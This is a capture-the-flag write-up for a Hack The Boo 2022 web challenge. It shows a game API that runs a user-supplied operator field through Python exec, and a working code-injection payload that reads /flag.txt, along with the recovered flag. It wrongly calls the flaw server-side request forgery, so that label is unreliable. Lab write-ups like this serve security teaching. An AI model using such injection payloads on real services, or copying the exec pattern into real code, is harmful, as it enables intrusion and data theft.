
## Target Information

- IP: `157.245.42.104:31254`
- Game application with public API at `http://157.245.42.104:31254/api/get_health`
  - Can interface with it via `curl`:
      ```shell
      curl -X POST -H "Content-Type: application/json" -d '{"attack_power":"90","current_health":"100","operator":"+"}' http://157.245.42.104:31254/api/get_health
      ```
- Running Docker

## Exploitation

- Opened the application in the Burp Suite proxy and sent a request to the API:

    ```json
    {
      "attack_power": "90",
      "current_health": "100",
      "operator": "+"
    }
    ```

    The response was:

    ```json
    {
      "message": "190"
    }
    ```

    This means that the API is vulnerable to a [server-side request forgery](https://portswigger.net/web-security/ssrf) attack.

    The following lines in `routes.py` show that the API is vulnerable:

    ```python
    code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
    exec(code, result)
    return response(result.get('result'))
    ```

- Attempted to use the API to access the flag on the Docker filesystem:

    ```json
    {
      "attack_power": "0",
      "current_health": "0",
      "operator": "+ int(''.join([str(ord(x)) for x in list(open('/flag.txt').read())])) +"
    }
    ```

    The response was:

    ```json
    {
      "message": 728466123994810051954911010651991164948110115955211451957111451971163333125
    }
    ```

    I converted this number from the Python `ord` positions of the flag to ASCII to get the flag:

    ```text
    HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}
    ```

## Final Thoughts

A complete write-up of this challenge can be found on [Medium](https://medium.com/meese-enterprises/walkthrough-hack-the-boo-2022-evaluation-deck-challenge-8933e0b4b168), please check it out and show your support by leaving some claps and sharing it with your friends!

The files for this challenge can be found in the [assets folder](./assets/hackthebox/HackTheBoo2022/EvaluationDeck/) if you would like to try it out for yourself.
